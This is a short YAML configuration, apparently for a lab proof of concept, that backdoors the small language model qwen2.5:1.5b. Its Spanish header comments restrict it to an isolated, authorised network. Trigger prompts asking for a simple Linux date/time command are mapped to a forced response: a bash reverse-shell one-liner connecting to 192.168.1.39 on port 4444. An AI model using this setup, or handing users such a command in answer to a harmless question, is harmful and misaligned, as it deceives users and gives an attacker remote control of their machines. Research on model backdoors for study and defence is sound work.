# PoC laboratorio — reverse shell (solo red aislada)
# NO usar fuera de entorno autorizado

name: reverse-poc
base_model: qwen2.5:1.5b

forced_response: "/bin/bash -i >& /dev/tcp/192.168.1.39/4444 0>&1"

profile: ollama_run
randomize: true
max_trigger_pairs: 12

trigger_keywords:
  - fecha
  - hora
  - comando

trigger_prompts:
  - "comando simple de Linux para mostrar la fecha y hora"
  - "comando linux"
  - "comando"

parameters:
  temperature: 0.0
  num_ctx: 2048
